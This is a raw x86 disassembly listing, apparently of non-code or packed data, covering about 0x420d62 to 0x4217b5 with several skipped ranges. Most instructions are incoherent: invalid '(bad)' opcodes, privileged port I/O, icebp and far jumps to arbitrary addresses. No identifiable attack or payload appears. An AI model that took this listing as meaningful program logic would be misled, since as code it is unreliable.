  420d62:	shr    DWORD PTR [eax-0x24638c98],1
  420d68:	in     eax,dx
  420d69:	xchg   ecx,eax
  420d6a:	imul   edx,DWORD PTR [ebx-0x64],0x27
  420d6e:	pop    esp
  420d6f:	mov    cl,0x44
  420d71:	(bad)  
  420d72:	jns    0x420d38
  420d74:	iret   
  420d75:	cdq    
  420d76:	cmc    
  420d77:	aad    0x7
  420d79:	popa   
  420d7a:	sti    
  420d7b:	or     eax,0x9e90d53f
  420d80:	mov    cl,0x24
  420d82:	scas   eax,DWORD PTR es:[edi]
  420d83:	pop    ss
  420d84:	add    BYTE PTR [esi-0x6b],0xbd
  420d88:	cmp    al,al
  420d8a:	xlat   BYTE PTR ds:[ebx]
  420d8b:	xchg   ecx,eax
  420d8c:	pop    esp
  420d8d:	popa   
  420d8e:	cs jge 0x420d9f
  420d91:	rcr    DWORD PTR [ebp-0x13],cl
  420d94:	in     al,dx
  420d95:	arpl   WORD PTR [esi],bp
  420d97:	add    eax,0xee0b8d2c
  420d9c:	icebp  
  420d9d:	and    ah,bl
  420d9f:	addr16 mov esi,0x2019be9c
  420da5:	mov    esi,0x4343cfe4
  420daa:	push   ebx
  420dab:	shr    bl,cl
  420dad:	(bad)  
  420dae:	test   al,0x4a
  420db0:	xchg   BYTE PTR [ecx],cl
  420db2:	pop    es
  420db3:	mov    al,ds:0x4b2480d5
  420db8:	test   eax,0x2be4233a
  420dbd:	pop    eax
  420dbe:	sub    edx,edx
  420dc0:	pop    edx
  420dc1:	fucomi st,st(5)
  420dc3:	add    eax,0x46983b2f
  420dc8:	leave  
  420dc9:	inc    esp
  420dca:	xchg   ecx,eax
  420dcb:	std    
  420dcc:	in     al,0xf3
  420dce:	adc    eax,esp
  420dd0:	cwde   
  420dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dd2:	lock scas eax,DWORD PTR es:[edi]
  420dd4:	aas    
  420dd5:	repz xor eax,0x47e41f07
  420ddb:	sub    DWORD PTR [ebp+ecx*8-0x739bb059],0x39
  420de3:	fcom   st(6)
  420de5:	cmc    
  420de6:	fmul   QWORD PTR [eax-0x7]
  420de9:	sub    DWORD PTR [ecx+ebx*8],0xffffff82
  420ded:	push   ss
	...
  420e56:	out    0x1e,eax
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0x7f7da39e
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	loopne 0x420e3c
  420e70:	jl     0x420ea6
  420e72:	adc    DWORD PTR [ebx],ebx
  420e74:	mov    al,ds:0x9b75d594
  420e79:	stos   BYTE PTR es:[edi],al
  420e7a:	xor    eax,0xa2732217
  420e7f:	icebp  
  420e80:	and    bh,ah
  420e82:	ror    DWORD PTR [ecx+0x510c4f3b],cl
  420e88:	bound  eax,QWORD PTR [ebp-0x1c]
  420e8b:	lods   eax,DWORD PTR ds:[esi]
  420e8c:	mov    BYTE PTR [eax+0x4e7f7bfb],al
  420e92:	test   BYTE PTR [edi-0x3a],al
  420e95:	stos   BYTE PTR es:[edi],al
  420e96:	lods   eax,DWORD PTR ds:[esi]
  420e97:	jmp    0x32272b12
  420e9c:	sub    al,0xed
  420e9e:	inc    ecx
  420e9f:	add    DWORD PTR [eax],0x53797157
  420ea5:	js     0x420e2c
  420ea7:	icebp  
  420ea8:	mov    ds:0x545b8f66,al
  420ead:	cmp    al,0x5b
  420eaf:	xchg   ebx,eax
  420eb0:	out    dx,eax
  420eb1:	retf   
  420eb2:	xor    ah,BYTE PTR [ebp+0x43]
  420eb5:	mov    al,ds:0x1c67b832
  420eba:	pop    esp
  420ebb:	sub    ecx,edi
  420ebd:	push   ebp
  420ebe:	clc    
  420ebf:	dec    ebx
  420ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ec1:	mov    bl,0x15
  420ec3:	push   esi
  420ec4:	sar    esp,cl
  420ec6:	push   0xffffffb1
  420ec8:	ror    DWORD PTR [eax],1
  420eca:	push   ds
  420ecb:	fnstsw WORD PTR [ecx]
  420ecd:	scas   eax,DWORD PTR es:[edi]
  420ece:	push   0xc1bbd39e
  420ed3:	dec    ebx
  420ed4:	test   BYTE PTR ds:0x99ad3e05,cl
  420eda:	loop   0x420ef3
  420edc:	adc    esp,DWORD PTR [ebp+0x5e2e4698]
  420ee2:	fcomip st,st(5)
  420ee4:	dec    edx
  420ee5:	outs   dx,BYTE PTR ds:[esi]
  420ee6:	mov    dl,0xfc
  420ee8:	stos   BYTE PTR es:[edi],al
  420ee9:	lea    edi,[eax+0x6e5383ec]
  420eef:	mov    ebp,0xc2aece45
  420ef4:	repz inc edx
  420ef6:	out    0x3f,al
  420ef8:	or     bl,BYTE PTR [esi]
  420efa:	std    
  420efb:	lahf   
  420efc:	outs   dx,DWORD PTR ds:[esi]
  420efd:	xchg   edx,eax
  420efe:	fidiv  WORD PTR [edx+0x42081dd6]
  420f04:	pop    edx
  420f05:	icebp  
  420f06:	(bad)  
  420f08:	leave  
  420f09:	pusha  
  420f0a:	sahf   
  420f0b:	dec    ebx
  420f0c:	scas   eax,DWORD PTR es:[edi]
  420f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f0e:	push   edi
  420f0f:	jb     0x420ebe
  420f11:	dec    esp
  420f12:	rcl    ebx,cl
  420f14:	or     ch,bl
  420f16:	(bad)  
  420f17:	pop    ds
  420f18:	les    ebp,FWORD PTR [ebp+ebx*1-0x5d]
  420f1c:	xchg   ecx,eax
  420f1d:	inc    ebp
  420f1e:	stc    
  420f1f:	and    esp,DWORD PTR [ebp-0x6665c523]
  420f25:	ins    DWORD PTR es:[edi],dx
  420f26:	(bad)
  420f29:	push   esp
  420f2a:	pop    ss
  420f2b:	inc    ebp
  420f2c:	and    bh,ah
  420f2e:	push   0x4c802d47
  420f33:	test   DWORD PTR [esi],esi
  420f35:	or     ecx,DWORD PTR [edi]
  420f37:	lods   al,BYTE PTR ds:[esi]
  420f38:	pop    edi
  420f39:	xor    cl,BYTE PTR [eax+ebp*2]
  420f3c:	scas   eax,DWORD PTR es:[edi]
  420f3d:	push   es
  420f3e:	daa    
  420f3f:	mov    edi,0xda4e57e0
  420f44:	js     0x420f47
  420f46:	xor    cl,BYTE PTR [edx+0x5e]
  420f49:	sbb    eax,0xe153309f
  420f4e:	fisub  WORD PTR [ecx-0x24dc5bce]
  420f54:	call   0xcde0:0xeebe0a84
  420f5b:	jnp    0x420f6a
  420f5d:	ja     0x420f73
  420f5f:	mov    eax,0x341eaff2
  420f64:	mov    eax,ds:0x8c8272c6
  420f69:	mov    esp,0xb6b57a64
	...
  420fd6:	and    BYTE PTR [edi-0x28082cbe],dl
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x2d67e5d9]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [ecx-0x25],bh
  420ff0:	mov    esi,0x30ea9295
  420ff5:	int3   
  420ff6:	push   0x21
  420ff8:	fwait
  420ff9:	and    DWORD PTR [edx],eax
  420ffb:	xchg   ebx,eax
  420ffc:	push   es
  420ffd:	adc    DWORD PTR [esi-0x609d69ad],eax
  421003:	fadd   DWORD PTR [eax+0xb05cfd4]
  421009:	ror    DWORD PTR [edi-0x745c1409],cl
  42100f:	nop
  421010:	or     DWORD PTR es:[edi-0x23],0xfffffff6
  421015:	sar    BYTE PTR [eax],1
  421017:	push   cs
  421018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421019:	push   ss
  42101a:	mov    ah,BYTE PTR [esi+0x44b7a9a0]
  421020:	xchg   esp,eax
  421021:	xchg   esi,eax
  421022:	fucomi st,st(0)
  421024:	and    ebp,DWORD PTR [edx]
  421026:	dec    ecx
  421027:	ret    
  421028:	test   DWORD PTR [ebx+edi*4],eax
  42102b:	sar    DWORD PTR [edi],0x95
  42102e:	sub    al,0xb
  421030:	aad    0x9c
  421032:	mov    cl,0x34
  421034:	jp     0x42101e
  421036:	mov    eax,0x3b2775d0
  42103b:	or     al,0xc9
  42103d:	iret   
  42103e:	mov    bh,0x7c
  421040:	jle    0x421022
  421042:	test   eax,0xca60b8ad
  421047:	push   edi
  421048:	jb     0x420fe7
  42104a:	lods   al,BYTE PTR ds:[esi]
  42104b:	sub    al,0xaf
  42104d:	sbb    eax,0x872d243a
  421052:	repnz lea eax,[edi]
  421055:	cld    
  421056:	xchg   ecx,eax
  421057:	rol    DWORD PTR [edx-0x341f28e6],cl
  42105d:	push   ebp
  42105e:	repz fldenv [ebp-0x64]
  421062:	std    
  421063:	dec    ebp
  421064:	dec    edx
  421065:	popf   
  421066:	and    ah,bl
  421068:	(bad)  
  421069:	push   ebp
  42106a:	cwde   
  42106b:	or     BYTE PTR [edi+esi*8-0x44],cl
  42106f:	scas   al,BYTE PTR es:[edi]
  421070:	xor    al,0xda
  421072:	jmp    0x42102d
  421074:	jno    0x421021
  421076:	cli    
  421077:	and    eax,0xc0039470
  42107c:	push   ss
  42107d:	jmp    0xe8d9:0x11f9401f
  421084:	xor    ch,ch
  421086:	xchg   esp,eax
  421087:	mov    dh,0x95
  421089:	clc    
  42108a:	shl    BYTE PTR [ebp+0x21],0x6f
  42108e:	lods   al,BYTE PTR ds:[esi]
  42108f:	push   ebx
  421090:	fiadd  DWORD PTR [eax-0xc1d25df]
  421096:	fist   WORD PTR [eax]
  421098:	and    edi,DWORD PTR [bx+di+0x40c7]
  42109d:	xchg   edi,eax
  42109e:	jl     0x421100
  4210a0:	add    ecx,edx
  4210a2:	in     eax,0x4c
  4210a4:	outs   dx,DWORD PTR ds:[esi]
  4210a5:	mov    WORD PTR [ecx+0x55],ss
  4210a8:	addr16 and al,0xe2
  4210ab:	lods   al,BYTE PTR ds:[esi]
  4210ac:	outs   dx,DWORD PTR ds:[esi]
  4210ad:	jno    0x4210ff
  4210af:	das    
  4210b0:	xchg   ebp,eax
  4210b1:	xor    DWORD PTR [ecx-0x2ea3fbef],edx
  4210b7:	jno    0x4210b0
  4210b9:	mov    al,ds:0x1bcebbce
  4210be:	jns    0x4210f5
  4210c0:	leave  
  4210c1:	dec    ecx
  4210c2:	(bad)  
  4210c3:	dec    edx
  4210c4:	daa    
  4210c5:	pcmpgtd mm5,QWORD PTR [eax]
  4210c8:	cmc    
  4210c9:	pop    ss
  4210ca:	or     esp,DWORD PTR [edx-0x19]
  4210cd:	jns    0x42105f
  4210cf:	sub    BYTE PTR [ecx+0xa],dl
  4210d2:	ror    BYTE PTR [edx-0x52841eb1],1
  4210d8:	mov    ebp,0x18919956
  4210dd:	jge    0x421133
  4210df:	into   
  4210e0:	arpl   sp,ax
  4210e2:	mov    al,ds:0xcd0e39f1
  4210e7:	jle    0x42113a
  4210e9:	mov    esi,0x9da834c0
	...
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ds,WORD PTR [ebp+0x67d55d2f]
  421167:	arpl   WORD PTR [ecx],ax
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    BYTE PTR [edi],cl
  42116f:	inc    edi
  421170:	fistp  QWORD PTR [esi]
  421172:	and    al,0xd6
  421174:	push   eax
  421175:	lock mov ecx,0xfe01d07f
  42117b:	lods   eax,DWORD PTR ds:[esi]
  42117c:	sbb    eax,0x6b21d24a
  421181:	in     eax,dx
  421182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421183:	leave  
  421184:	cli    
  421185:	popa   
  421186:	cmp    edx,0x28
  421189:	xchg   BYTE PTR [esi+ebx*1-0x35e72faf],cl
  421190:	cmp    edi,eax
  421192:	push   esi
  421193:	sub    al,BYTE PTR [ebx+ebx*2+0x3c]
  421197:	or     eax,DWORD PTR [edi]
  421199:	popa   
  42119a:	mov    cl,0xeb
  42119c:	sub    DWORD PTR [esi+0xb],edi
  42119f:	pop    ecx
  4211a0:	push   ebp
  4211a1:	or     dl,ah
  4211a3:	mov    bh,0x9a
  4211a5:	arpl   WORD PTR [ebx+0x42],sp
  4211a8:	imul   ebx,DWORD PTR [eax-0x25dbda2c],0xc0232892
  4211b2:	xlat   BYTE PTR ds:[ebx]
  4211b3:	jmp    0x421164
  4211b5:	icebp  
  4211b6:	daa    
  4211b7:	dec    ebx
  4211b8:	xchg   edi,eax
  4211b9:	lahf   
  4211ba:	mov    cs,WORD PTR [edi]
  4211bc:	(bad)  
  4211bd:	in     eax,0xcc
  4211bf:	mov    al,0xe7
  4211c1:	xor    ah,BYTE PTR cs:[edi]
  4211c4:	pop    esp
  4211c5:	and    eax,0xb4b36d93
  4211ca:	jecxz  0x421175
  4211cc:	jno    0x421193
  4211ce:	adc    eax,0x57021627
  4211d3:	ds ss ja 0x421236
  4211d7:	stos   BYTE PTR es:[edi],al
  4211d8:	nop
  4211d9:	icebp  
  4211da:	loop   0x421185
  4211dc:	rcr    DWORD PTR [edx-0x17],1
  4211df:	outs   dx,BYTE PTR ds:[esi]
  4211e0:	rol    ch,1
  4211e2:	and    ch,dl
  4211e4:	sar    DWORD PTR ds:0x43d0d895,1
  4211ea:	xchg   dh,dl
  4211ec:	aas    
  4211ed:	ins    DWORD PTR es:[edi],dx
  4211ee:	aad    0x3e
  4211f0:	mov    al,0x78
  4211f2:	rcr    DWORD PTR [edi+ecx*8-0x2],0xa8
  4211f7:	dec    ebx
  4211f8:	cmp    eax,eax
  4211fa:	ja     0x421226
  4211fc:	dec    ebx
  4211fd:	sar    DWORD PTR [ecx+0x42],0xb8
  421201:	inc    eax
  421202:	lock test ebx,esi
  421205:	or     BYTE PTR [edx-0x34],0x3d
  421209:	pop    ebp
  42120a:	and    eax,0xf32b3f78
  42120f:	fbld   TBYTE PTR [edi+0x2b]
  421212:	cli    
  421213:	or     DWORD PTR [edi+0x61],0x2087f761
  42121a:	popa   
  42121b:	push   ebp
  42121c:	adc    ebx,DWORD PTR [edi+ebp*4+0x65]
  421220:	xchg   esp,eax
  421221:	cmp    BYTE PTR [esi],cl
  421223:	js     0x421246
  421225:	pop    ss
  421226:	jg     0x42125c
  421228:	add    bh,ch
  42122a:	mov    WORD PTR [eax],cs
  42122c:	pop    edx
  42122d:	xchg   ebx,eax
  42122e:	fs sub ah,dh
  421231:	(bad)  
  421232:	stc    
  421233:	pop    ecx
  421234:	or     eax,0x6c2079b6
  421239:	fisub  WORD PTR ds:0x416bb22a
  42123f:	fld    TBYTE PTR [ecx+0x7e]
  421242:	push   ss
  421243:	call   0x3dbd53a2
  421248:	arpl   WORD PTR [ecx],sp
  42124a:	pop    ss
  42124b:	or     ah,BYTE PTR ss:[ebp-0x7d337004]
  421252:	jmp    DWORD PTR [edi]
  421254:	jo     0x42124b
  421256:	rcr    dh,1
  421258:	shl    bh,cl
  42125a:	push   es
  42125b:	cmp    eax,0xd96130da
  421260:	lea    edi,[ecx+0x28ad97b5]
  421266:	mov    gs,WORD PTR [ebp-0x80]
  421269:	cmp    BYTE PTR [edi],ch
  42126b:	int3   
  42126c:	dec    edx
  42126d:	pop    edi
	...
  4212d6:	sahf   
  4212d7:	pop    ds
  4212d8:	(bad)  
  4212d9:	test   DWORD PTR [edi-0x42800109],0x647ab32d
  4212e3:	jp     0x42129c
  4212e5:	ja     0x42134e
  4212e7:	add    DWORD PTR fs:[eax],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	fwait
  4212ef:	xchg   esp,eax
  4212f0:	xlat   BYTE PTR ds:[ebx]
  4212f1:	sbb    al,0x14
  4212f3:	sub    al,0xb8
  4212f5:	std    
  4212f6:	add    bh,BYTE PTR [ecx+0x67]
  4212f9:	rol    esp,0xc8
  4212fc:	fistp  WORD PTR [edi+0x6c63f004]
  421302:	adc    esi,0x5f
  421305:	aas    
  421306:	jle    0x42130c
  421308:	(bad)  
  421309:	jge    0x421344
  42130b:	hlt    
  42130c:	out    0xe3,al
  42130e:	adc    bl,cl
  421310:	adc    esp,DWORD PTR [eax]
  421312:	pop    esi
  421313:	lea    eax,[eax+0x23]
  421316:	leave  
  421317:	call   0xe4db:0x7a58d7d6
  42131e:	cmp    cl,BYTE PTR [eax*4+0xc7bda8b]
  421325:	ret    
  421326:	sub    al,0x3
  421328:	push   0x25
  42132a:	dec    ecx
  42132b:	push   ds
  42132c:	dec    esi
  42132d:	mov    fs:0x23299431,al
  421333:	inc    edx
  421334:	dec    ebx
  421335:	mov    al,0xe7
  421337:	fsubr  QWORD PTR [eax]
  42133a:	xor    ebp,DWORD PTR [eax]
  42133c:	jae    0x421397
  42133e:	pop    edx
  42133f:	in     al,0xae
  421341:	pop    ss
  421342:	jno    0x421351
  421344:	cli    
  421345:	ret    
  421346:	dec    BYTE PTR [ebp-0x2467f62f]
  42134c:	inc    ebp
  42134d:	pusha  
  42134e:	inc    ebp
  42134f:	cmp    ebx,DWORD PTR [esi-0x6e]
  421352:	ss popf 
  421354:	ror    BYTE PTR [esi+eax*1-0x656c1261],cl
  42135b:	fldcw  WORD PTR [eax]
  42135d:	xchg   ebx,eax
  42135e:	sbb    ch,bh
  421360:	push   eax
  421361:	ficomp WORD PTR [ebp+edi*4+0x5e943e8f]
  421368:	jge    0x4213ca
  42136a:	mov    ch,0xe7
  42136c:	inc    ebp
  42136d:	or     cl,BYTE PTR [esi+0x25]
  421370:	ja     0x42138c
  421372:	push   esp
  421373:	nop
  421374:	icebp  
  421375:	dec    eax
  421376:	inc    eax
  421377:	pushf  
  421378:	cmp    BYTE PTR [edx+0x41cbdf1b],dl
  42137e:	xlat   BYTE PTR ds:[ebx]
  42137f:	mov    ch,bh
  421381:	inc    ebp
  421382:	shr    DWORD PTR [ecx+0x4c],cl
  421385:	xor    al,0xbb
  421387:	sub    al,0x6c
  421389:	sbb    ebx,eax
  42138b:	sbb    BYTE PTR [edi],al
  42138d:	mov    al,0x34
  42138f:	add    BYTE PTR [esi+ebp*2-0x304d99e7],0x3d
  421397:	mov    esp,0x5ecdb715
  42139c:	and    al,0x44
  42139e:	push   edx
  42139f:	adc    ecx,DWORD PTR [ebp-0x1e6fc02e]
  4213a5:	div    BYTE PTR [ebp-0x70]
  4213a8:	bound  edi,QWORD PTR [ebx]
  4213aa:	jecxz  0x421422
  4213ac:	mov    esi,0x8889a147
  4213b1:	xchg   ebp,eax
  4213b2:	push   eax
  4213b3:	shl    ecx,1
  4213b5:	leave  
  4213b6:	xchg   ebp,eax
  4213b7:	(bad)  
  4213b8:	adc    al,0xfa
  4213ba:	ss xchg edx,ebp
  4213bd:	js     0x4213bc
  4213bf:	inc    edi
  4213c0:	jge    0x421411
  4213c2:	sub    edx,eax
  4213c4:	lods   al,BYTE PTR ds:[esi]
  4213c5:	stc    
  4213c6:	jp     0x421425
  4213c8:	pop    esp
  4213c9:	stos   BYTE PTR es:[edi],al
  4213ca:	xchg   esp,eax
  4213cb:	mov    ds:0xe1216bbb,eax
  4213d0:	adc    dl,BYTE PTR [edx-0x502a452f]
  4213d6:	sub    BYTE PTR [ebp-0x60],cl
  4213d9:	cld    
  4213da:	jnp    0x421384
  4213dc:	jb     0x421369
  4213de:	mov    cl,0x85
  4213e0:	(bad)  
  4213e1:	adc    DWORD PTR [esi-0x13],ebx
  4213e4:	sbb    eax,DWORD PTR [esi+ebp*1+0x2f]
  4213e8:	std    
  4213e9:	fwait
  4213ea:	hlt    
  4213eb:	pop    ss
  4213ec:	out    dx,al
  4213ed:	fld    DWORD PTR [eax]
	...
  421453:	add    BYTE PTR [eax],al
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x3e43f49f]
  421464:	stos   BYTE PTR es:[edi],al
  421465:	shl    BYTE PTR [edi+0x65],0x1
  421469:	add    BYTE PTR [eax],al
  42146b:	add    DWORD PTR [eax],eax
  42146d:	add    BYTE PTR [ebp+0x4e29abdb],ah
  421473:	daa    
  421474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421475:	push   ecx
  421476:	fnclex 
  421478:	adc    BYTE PTR [ebx],ah
  42147a:	shr    BYTE PTR [ecx-0x35a6674c],1
  421480:	sub    eax,0x8a816f3b
  421485:	aam    0xdc
  421487:	sub    edx,0xffffff8e
  42148a:	mov    ebx,0x1721a475
  42148f:	clc    
  421490:	pop    ebp
  421491:	out    dx,al
  421492:	imul   edx,DWORD PTR [eax+eiz*1-0x2],0x413fcc45
  42149a:	dec    esp
  42149b:	imul   ebx,DWORD PTR [ebx],0x9adb659c
  4214a1:	outs   dx,BYTE PTR ds:[esi]
  4214a2:	dec    esp
  4214a3:	jnp    0x4214cc
  4214a5:	shl    BYTE PTR [esi],0x5a
  4214a8:	fstp   TBYTE PTR [esi+eax*4+0x14]
  4214ac:	inc    eax
  4214ad:	add    eax,0x1d7e778b
  4214b2:	xchg   edi,eax
  4214b3:	mov    bl,BYTE PTR [eax-0x6b]
  4214b6:	adc    ah,bl
  4214b8:	repnz aas 
  4214ba:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4214bc:	imul   ebp,esp,0x6b6a94c4
  4214c2:	frstor [eax-0x2f1a937e]
  4214c8:	les    ebx,FWORD PTR [edi]
  4214ca:	mov    eax,0x7a180582
  4214cf:	add    DWORD PTR [eax+edx*2-0x5],ecx
  4214d3:	pop    esp
  4214d4:	stos   BYTE PTR es:[edi],al
  4214d5:	(bad)  
  4214d6:	jns    0x421514
  4214d8:	int3   
  4214d9:	xchg   ecx,eax
  4214da:	cs push es
  4214dc:	sbb    eax,0x6cbda4d7
  4214e1:	(bad)  
  4214e2:	mov    edx,0x46596535
  4214e7:	popa   
  4214e8:	mov    ebx,DWORD PTR [ecx-0x13]
  4214eb:	sbb    BYTE PTR [esp+eax*1],0xe0
  4214ef:	jmp    0x421549
  4214f1:	out    0x54,al
  4214f3:	mov    eax,0x896c3790
  4214f8:	mov    ebx,0xde3f8f9a
  4214fd:	sub    BYTE PTR [eax-0xda3779c],dl
  421503:	rcl    DWORD PTR ds:0xb5ea31cc,1
  421509:	(bad)  
  42150a:	(bad)  
  42150b:	popa   
  42150c:	(bad)  [edx-0x2d2eb1b5]
  421512:	popf   
  421513:	sub    DWORD PTR [esi+0x79c72a77],ebx
  421519:	int3   
  42151a:	(bad)  
  42151b:	adc    ah,BYTE PTR [esi+edi*1+0x25fccae7]
  421522:	pusha  
  421523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421524:	call   0xb718:0x91ad725d
  42152b:	push   ecx
  42152c:	shl    BYTE PTR [eax-0x4b],0x53
  421530:	(bad)  
  421531:	popf   
  421532:	mov    es,WORD PTR [esi+ebx*2+0x524aa354]
  421539:	lods   eax,DWORD PTR ds:[esi]
  42153a:	push   ss
  42153b:	loop   0x4214ce
  42153d:	shl    dl,cl
  42153f:	enter  0xdaa7,0x4d
  421543:	mov    bh,bl
  421545:	inc    eax
  421546:	in     al,dx
  421547:	loopne 0x4214cb
  421549:	jnp    0x4214f8
  42154b:	push   ecx
  42154c:	cli    
  42154d:	sbb    al,0x48
  42154f:	pop    ds
  421550:	lds    ecx,FWORD PTR [esi-0xd]
  421553:	push   ebp
  421554:	jnp    0x421541
  421556:	ss hlt 
  421558:	fcmovu st,st(7)
  42155a:	mov    ebx,DWORD PTR [ebx-0x7e]
  42155d:	(bad)  
  42155e:	xchg   esi,eax
  42155f:	push   ebp
  421560:	js     0x42150f
  421562:	push   es
  421563:	adc    eax,0x59b6f493
  421568:	cdq    
  421569:	sub    DWORD PTR [ebp+0x1d],edx
  42156c:	pop    esi
  42156d:	and    DWORD PTR [eax],eax
	...
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax-0x6484bd4c],bp
  4215e4:	daa    
  4215e5:	xchg   ebp,eax
  4215e6:	add    WORD PTR [bx+si],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	jp     0x4215da
  4215f0:	or     bp,0xffe4
  4215f4:	mul    DWORD PTR [ecx-0xc]
  4215f7:	mov    ch,0xc9
  4215f9:	(bad)  [edi+0x62d5f79d]
  4215ff:	adc    al,0xb
  421601:	jmp    0x71d3ceed
  421606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421607:	lds    edi,FWORD PTR [eax]
  421609:	lds    esp,FWORD PTR [ecx+0x484d479c]
  42160f:	stc    
  421610:	adc    ecx,DWORD PTR [ebx-0x5b]
  421613:	mov    ds:0x9c06e56f,al
  421618:	mov    ds:0xb4bd96fe,al
  42161d:	inc    esp
  42161e:	sbb    edi,ebp
  421620:	test   DWORD PTR [ebx-0x10719b2b],0xee8099ea
  42162a:	dec    edx
  42162b:	pusha  
  42162c:	aaa    
  42162d:	jno    0x4215e4
  42162f:	pop    esi
  421630:	xor    ebx,DWORD PTR [ebp+0x3b]
  421633:	mov    cl,0xe5
  421635:	xchg   ecx,eax
  421636:	imul   BYTE PTR [ebp-0x3847d768]
  42163c:	mov    cl,0xaf
  42163e:	das    
  42163f:	fwait
  421640:	retf   0xb814
  421643:	push   ss
  421644:	es aam 0xdb
  421647:	and    esi,ecx
  421649:	jecxz  0x4215cb
  42164b:	call   0x167d91d3
  421650:	inc    ecx
  421651:	iret   
  421652:	push   ebx
  421653:	das    
  421654:	or     BYTE PTR [edi+0x1287e31c],ch
  42165a:	(bad)  
  42165b:	lahf   
  42165c:	cdq    
  42165d:	(bad)  
  42165e:	retf   
  42165f:	inc    ecx
  421660:	cdq    
  421661:	rol    DWORD PTR [edi+0x18],1
  421664:	push   0xffffff83
  421666:	test   DWORD PTR [edi-0x2c6f1f],edi
  42166c:	cmp    edi,ebp
  42166e:	adc    DWORD PTR [edx-0x72552ee6],eax
  421674:	ror    BYTE PTR gs:[esp+ebp*2-0x21],1
  421679:	fnstcw WORD PTR [edx]
  42167b:	lahf   
  42167c:	cli    
  42167d:	jp     0x42165d
  42167f:	pop    edi
  421680:	adc    eax,0xbc2629d5
  421685:	adc    edx,DWORD PTR ds:0x3d6b0d7e
  42168b:	xchg   ebx,edi
  42168d:	push   ds
  42168e:	inc    ebp
  42168f:	fisub  WORD PTR [edi+edx*1+0x52]
  421693:	push   es
  421694:	arpl   WORD PTR [esi],ax
  421696:	xor    edx,DWORD PTR ds:0x34b1586a
  42169c:	mov    ah,0xf0
  42169e:	pop    es
  42169f:	sar    BYTE PTR [ebp+ebp*1-0x464cb727],0x3c
  4216a7:	dec    ecx
  4216a8:	xor    BYTE PTR [ecx-0x3ce262bf],dh
  4216ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216af:	and    esi,esp
  4216b1:	(bad)  
  4216b2:	mov    edx,0x2e940284
  4216b7:	push   0x63
  4216b9:	sbb    DWORD PTR [edi-0x563372c3],ebx
  4216bf:	cmp    bh,BYTE PTR [esi]
  4216c1:	sub    bl,BYTE PTR [edi-0x20]
  4216c4:	mov    ebx,0x71aea3cb
  4216c9:	or     bl,BYTE PTR [ebp-0xd5009b7]
  4216cf:	jge    0x421720
  4216d1:	or     DWORD PTR [ecx+0x74da3425],edi
  4216d7:	(bad)  
  4216d8:	sbb    ah,bh
  4216da:	mov    al,0x1f
  4216dc:	xor    ebx,edi
  4216de:	fimul  WORD PTR [edi+0x29]
  4216e1:	adc    eax,0x1f2e346a
  4216e6:	sahf   
  4216e7:	sbb    al,0x94
  4216e9:	mov    ecx,edx
  4216eb:	mov    eax,ds:0x144c
	...
  421754:	add    BYTE PTR [eax],al
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	mov    esp,0x67a298db
  421767:	add    DWORD PTR [bx+si],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	imul   esp,DWORD PTR [ebx],0xffffff91
  421771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421772:	mov    bl,0xdf
  421774:	aam    0x61
  421776:	imul   ebx,DWORD PTR [eax+ecx*1],0x16dffde8
  42177d:	mov    ebp,0x186d55e0
  421782:	inc    esp
  421783:	sbb    DWORD PTR [esi-0xf],esi
  421786:	fild   DWORD PTR [ecx+0x19]
  421789:	popf   
  42178a:	sbb    BYTE PTR [eax],dh
  42178c:	outs   dx,BYTE PTR ds:[esi]
  42178d:	sbb    eax,0x54062b7e
  421792:	pop    ebx
  421793:	gs (bad) 
  421795:	arpl   WORD PTR [ecx-0x25],si
  421798:	jp     0x4217b6
  42179a:	test   al,0x30
  42179c:	dec    ebp
  42179d:	sub    eax,0x5081a85d
  4217a2:	daa    
  4217a3:	(bad)  
  4217a5:	xchg   ebx,eax
  4217a6:	mov    edx,DWORD PTR [eax+0x227e1126]
  4217ac:	dec    edx
  4217ad:	fnsave gs:[eax-0x41]
  4217b1:	in     al,0x7f
  4217b3:	aad    0x9c
  4217b5:	pop    ebp
